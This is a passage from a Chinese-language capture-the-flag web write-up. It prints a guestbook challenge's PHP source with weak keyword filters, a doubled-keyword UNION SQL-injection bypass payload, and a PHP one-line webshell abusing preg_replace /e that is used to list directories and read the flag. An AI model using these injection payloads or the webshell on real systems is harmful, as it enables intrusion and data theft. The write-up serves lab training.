 <span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;antiinject.php&#39;</span>; 
 <span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;antixss.php&#39;</span>; 
 $id<span style="color:#f92672">=</span><span style="color:#a6e22e">antiinject</span>($id); 
 $con <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_connect</span>($db_address,$db_user,$db_pass) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;不能连接到数据库！！&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">mysql_error</span>()); 
 <span style="color:#a6e22e">mysql_select_db</span>($db_name,$con); 
 $id<span style="color:#f92672">=</span><span style="color:#a6e22e">mysql_real_escape_string</span>($id); 
 $result<span style="color:#f92672">=</span><span style="color:#a6e22e">mysql_query</span>(<span style="color:#e6db74">&#34;SELECT * FROM `message` WHERE display=1 AND id=</span><span style="color:#e6db74">$id</span><span style="color:#e6db74">&#34;</span>); $rs<span style="color:#f92672">=</span><span style="color:#a6e22e">mysql_fetch_array</span>($result); 
 <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">htmlspecialchars</span>($rs[<span style="color:#e6db74">&#39;nice&#39;</span>])<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">antixss</span>($rs[<span style="color:#e6db74">&#39;say&#39;</span>])<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;br /&gt;&#39;</span>; 
 <span style="color:#a6e22e">mysql_free_result</span>($result); 
 <span style="color:#a6e22e">mysql_free_result</span>($file); 
 <span style="color:#a6e22e">mysql_close</span>($con); 
 <span style="color:#75715e">?&gt;</span> 
</code></pre></div></li>
<li>
<p>passencode.php</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> 
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">passencode</span>($content){ 
    <span style="color:#75715e">//$pass=urlencode($content); 
</span><span style="color:#75715e"></span>    $array<span style="color:#f92672">=</span><span style="color:#a6e22e">str_split</span>($content); 
    $pass<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>; 
    <span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">count</span>($array);$i<span style="color:#f92672">++</span>){ 
        <span style="color:#66d9ef">if</span>($pass<span style="color:#f92672">!=</span><span style="color:#e6db74">&#34;&#34;</span>){ 
            $pass<span style="color:#f92672">=</span>$pass<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">.</span>(<span style="color:#a6e22e">string</span>)<span style="color:#a6e22e">ord</span>($array[$i]); 
        }<span style="color:#66d9ef">else</span>{ 
            $pass<span style="color:#f92672">=</span>(<span style="color:#a6e22e">string</span>)<span style="color:#a6e22e">ord</span>($array[$i]); 
        } 
    } 
<span style="color:#66d9ef">return</span> $pass; 
} 
<span style="color:#75715e">?&gt;</span>
</code></pre></div></li>
<li>
<p>say.php</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> 
<span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;config.php&#39;</span>; 
$nice<span style="color:#f92672">=</span>$_POST[<span style="color:#e6db74">&#39;nice&#39;</span>]; 
$say<span style="color:#f92672">=</span>$_POST[<span style="color:#e6db74">&#39;usersay&#39;</span>]; 
<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_COOKIE[<span style="color:#e6db74">&#39;username&#39;</span>])){ 
    <span style="color:#a6e22e">setcookie</span>(<span style="color:#e6db74">&#39;username&#39;</span>,$nice); 
    <span style="color:#a6e22e">setcookie</span>(<span style="color:#e6db74">&#39;userpass&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>); 
} 
$username<span style="color:#f92672">=</span>$_COOKIE[<span style="color:#e6db74">&#39;username&#39;</span>]; 
$userpass<span style="color:#f92672">=</span>$_COOKIE[<span style="color:#e6db74">&#39;userpass&#39;</span>]; 
<span style="color:#66d9ef">if</span>($nice<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">||</span> $say<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;&#34;</span>){ 
    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;script&gt;alert(&#39;昵称或留言内容不能为空！(如果有内容也弹出此框，不是网站问题喔~ 好吧，给个提示：查看页面源码有惊喜！)&#39;);&lt;/script&gt;&#34;</span>; 
    <span style="color:#66d9ef">exit</span>(); 
} 
$con <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_connect</span>($db_address,$db_user,$db_pass) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;不能连接到数据库！！&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">mysql_error</span>()); 
<span style="color:#a6e22e">mysql_select_db</span>($db_name,$con); 
$nice<span style="color:#f92672">=</span><span style="color:#a6e22e">mysql_real_escape_string</span>($nice); 
$username<span style="color:#f92672">=</span><span style="color:#a6e22e">mysql_real_escape_string</span>($username); 
$userpass<span style="color:#f92672">=</span><span style="color:#a6e22e">mysql_real_escape_string</span>($userpass); 
$result<span style="color:#f92672">=</span><span style="color:#a6e22e">mysql_query</span>(<span style="color:#e6db74">&#34;SELECT username FROM admin where username=&#39;</span><span style="color:#e6db74">$nice</span><span style="color:#e6db74">&#39;&#34;</span>,$con); 
$login<span style="color:#f92672">=</span><span style="color:#a6e22e">mysql_query</span>(<span style="color:#e6db74">&#34;SELECT * FROM admin where username=&#39;</span><span style="color:#e6db74">$username</span><span style="color:#e6db74">&#39; AND userpass=&#39;</span><span style="color:#e6db74">$userpass</span><span style="color:#e6db74">&#39;&#34;</span>,$con); 
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">mysql_num_rows</span>($result)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">mysql_num_rows</span>($login)<span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">0</span>){ 
    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;script&gt;alert(&#39;昵称已被使用，请更换！&#39;);&lt;/script&gt;&#34;</span>; <span style="color:#a6e22e">mysql_free_result</span>($login); 
    <span style="color:#a6e22e">mysql_free_result</span>($result); 
    <span style="color:#a6e22e">mysql_close</span>($con); 
    <span style="color:#66d9ef">exit</span>(); 
} 
<span style="color:#a6e22e">mysql_free_result</span>($login); 
<span style="color:#a6e22e">mysql_free_result</span>($result); 
$say<span style="color:#f92672">=</span><span style="color:#a6e22e">mysql_real_escape_string</span>($say); 
<span style="color:#a6e22e">mysql_query</span>(<span style="color:#e6db74">&#34;insert into message (nice,say,display) values(&#39;</span><span style="color:#e6db74">$nice</span><span style="color:#e6db74">&#39;,&#39;</span><span style="color:#e6db74">$say</span><span style="color:#e6db74">&#39;,0)&#34;</span>,$con); 
<span style="color:#a6e22e">mysql_close</span>($con); 
<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;script&gt;alert(&#34;构建和谐社会，留言需要经过管理员审核才可以显示！&#34;);window.location = &#34;./index.php&#34;&lt;/script&gt;&#39;</span>; 
<span style="color:#75715e">?&gt;</span>
</code></pre></div></li>
<li>
<p>preview.php</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> 
$prenice<span style="color:#f92672">=</span>$_POST[<span style="color:#e6db74">&#39;nice&#39;</span>];
$presay<span style="color:#f92672">=</span>$_POST[<span style="color:#e6db74">&#39;usersay&#39;</span>]; 
<span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;antixss.php&#39;</span>; 
<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&#34;&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">antixss</span>($presay)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#34;&#39;</span>; 
<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">htmlspecialchars</span>($prenice);
<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">antixss</span>($presay);
<span style="color:#75715e">?&gt;</span>
</code></pre></div></li>
</ol>
<p>发现了一些新的页面 ./antiinject.php ./antixss.php ./loginxlcteam/</p>
<ol start="7">
<li>antiinject.php
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> 
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">antiinject</span>($content){ 
    $keyword<span style="color:#f92672">=</span><span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;select&#34;</span>,<span style="color:#e6db74">&#34;union&#34;</span>,<span style="color:#e6db74">&#34;and&#34;</span>,<span style="color:#e6db74">&#34;from&#34;</span>,<span style="color:#e6db74">&#39; &#39;</span>,<span style="color:#e6db74">&#34;&#39;&#34;</span>,<span style="color:#e6db74">&#34;;&#34;</span>,<span style="color:#e6db74">&#39;&#34;&#39;</span>,<span style="color:#e6db74">&#34;char&#34;</span>,<span style="color:#e6db74">&#34;or&#34;</span>,<span style="color:#e6db74">&#34;count&#34;</span>,<span style="color:#e6db74">&#34;master&#34;</span>,<span style="color:#e6db74">&#34;name&#34;</span>,<span style="color:#e6db74">&#34;pass&#34;</span>,<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#e6db74">&#34;+&#34;</span>,<span style="color:#e6db74">&#34;-&#34;</span>,<span style="color:#e6db74">&#34;order&#34;</span>,<span style="color:#e6db74">&#34;=&#34;</span>); 
    $info<span style="color:#f92672">=</span><span style="color:#a6e22e">strtolower</span>($content); 
    <span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;=</span><span style="color:#a6e22e">count</span>($keyword);$i<span style="color:#f92672">++</span>){ 
        $info<span style="color:#f92672">=</span><span style="color:#a6e22e">str_replace</span>($keyword[$i], <span style="color:#e6db74">&#39;&#39;</span>,$info); 
    } 
    <span style="color:#66d9ef">return</span> $info; 
} <span style="color:#75715e">?&gt;</span>
</code></pre></div></li>
<li>antixss.php
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> 
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">antixss</span>($content){ 
    <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/(.*)\[a\](.*)\[\/a\](.*)/&#34;</span>,$content,$url); 
    $key<span style="color:#f92672">=</span><span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;(&#34;</span>,<span style="color:#e6db74">&#34;)&#34;</span>,<span style="color:#e6db74">&#34;&amp;&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;&lt;&#34;</span>,<span style="color:#e6db74">&#34;&gt;&#34;</span>,<span style="color:#e6db74">&#34;&#39;&#34;</span>,<span style="color:#e6db74">&#34;%28&#34;</span>,<span style="color:#e6db74">&#34;%29&#34;</span>,<span style="color:#e6db74">&#34; on&#34;</span>,<span style="color:#e6db74">&#34;data&#34;</span>,<span style="color:#e6db74">&#34;src&#34;</span>,<span style="color:#e6db74">&#34;eval&#34;</span>,<span style="color:#e6db74">&#34;unescape&#34;</span>,<span style="color:#e6db74">&#34;innerHTML&#34;</span>,<span style="color:#e6db74">&#34;document&#34;</span>,<span style="color:#e6db74">&#34;appendChild&#34;</span>,<span style="color:#e6db74">&#34;createElement&#34;</span>,<span style="color:#e6db74">&#34;write&#34;</span>,<span style="color:#e6db74">&#34;String&#34;</span>,<span style="color:#e6db74">&#34;setTimeout&#34;</span>,<span style="color:#e6db74">&#34;cookie&#34;</span>);
    <span style="color:#75715e">//因为太菜，很懒，所以。。。(过滤规则来自Mramydnei) $re=$url[2]; if(count($url)==0){ return htmlspecialchars($content); }else{ for($i=0;$i&lt;=count($key);$i++){ $re=str_replace($key[$i], &#39;_&#39;,$re); } return htmlspecialchars($url[1],ENT_QUOTES).&#39;&lt;a href=&#34;&#39;.$re.&#39;&#34;&gt;&#39;.$re.&#39;&lt;/a&gt;&#39;.htmlspecialchars($url[3],ENT_QUOTES); } } 
</span><span style="color:#75715e"></span>    <span style="color:#75715e">?&gt;</span>
</code></pre></div></li>
</ol>
<h2 id="尝试对-sophp-进行-sql-注入">尝试对 so.php 进行 sql 注入</h2>
<p>将 User-Angent 改为 Xlcteam Browser，提交参数 soid 开始注入。</p>
<p>查询语句为 <code>SELECT * FROM </code>message<code> WHERE display=1 AND id=$id</code></p>
<p>id 没有包裹引号，过滤规则双写即可绕过，因为是按顺序进行替换敏感词，因此在语句中插入 ‘=’ 也可</p>
<p>构造 <code>soid=1/**/aandnd/**/0/**/uniunionon/**/seselectlect/**/1,2,3,4</code> 回显为2，3。
根据 admin 表结构一通注入 ，得到</p>
<p><code>  admin   102 117 99 107 114 117 110 116 117</code></p>
<p>密码转换出来后即可进入后台,提示有一个小马，使用 about.php 获取小马内容</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> $e <span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">&#39;www&#39;</span>]; 
$arr <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>($_POST[<span style="color:#e6db74">&#39;wtf&#39;</span>] <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;|.*|e&#39;</span>,); 
<span style="color:#a6e22e">array_walk</span>($arr, $e, <span style="color:#e6db74">&#39;&#39;</span>); <span style="color:#75715e">?&gt;</span>
</code></pre></div><blockquote>
<p>数组的value中是|.*|e，这里用到了正则匹配的preg_replace()的一个漏洞：</p>
<p>参考 <a href="https://www.jb51.net/article/38714.htm">https://www.jb51.net/article/38714.htm</a></p>
<p>简单来说就是正则中/e(这里和|e效果一样) 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。
所以我们可以传递preg_replace给www，这样array中的值就是第一个参数，键就是第二个参数，正好可以利用preg_replace的漏洞，然后会执行$_POST[‘wtf’]，就相当于一个一句话马了。</p>
</blockquote>
<p>url 里加入参数 www=preg_replace ,post 参数 wtf=print_r(scandir(.)) 列出目录，flag 所在文件名为 &lsquo;恭喜你获得flag2.txt&rsquo; , 利用 about.php 读取即可。</p>

    </div>

    <div class="post-copyright">
             
            <p class="copyright-item">
                <span>Author:</span>
                <span>Gordon.Kwok </span>
                </p>
            
           
             
            <p class="copyright-item">
                    <span>Link:</span>
                    <a href=https://gordongwb.github.io/2020/cg-ctf-web-2/>https://gordongwb.github.io/2020/cg-ctf-web-2/</span>
            </p>
            
             
            <p class="copyright-item lincese">
                本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可
            </p>
            
    </div>

  
    <div class="post-tags">
        
            <section>
            <i class="iconfont icon-tag"></i>Tag(s): 
            
            <span class="tag"><a href="https://gordongwb.github.io/tags/ctf/">
                    #CTF</a></span>
            
            <span class="tag"><a href="https://gordongwb.github.io/tags/web/">
                    #Web</a></span>
            
            </section>
        
        <section>
                <a href="javascript:window.history.back();">back</a></span> · 
                <span><a href="https://gordongwb.github.io">home</a></span>
        </section>
    </div>

    <div class="post-nav">
        
        <a href="https://gordongwb.github.io/2020/cg-ctf-web-1/" class="prev" rel="prev" title="CG CTF Web #1"><i class="iconfont icon-left"></i>&nbsp;CG CTF Web #1</a>
         
        
    </div>

    <div class="post-comment">
          
                 
          
    </div>
</article>
          </div>
		   </main>
      <footer class="footer">
    <div class="copyright">
        &copy;
        
        <span itemprop="copyrightYear">2016 - 2020</span>
        
        <span class="with-love">
    	 <i class="iconfont icon-love"></i> 
         </span>
         
            <span class="author" itemprop="copyrightHolder"><a href="https://gordongwb.github.io">Gordon.Kwok</a> | </span> 
         

         
		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
    </div>
</footer>












    
    
    <script src="/js/vendor_no_gallery.min.js" async=""></script>
    
  



     </div>
  </body>
</html>
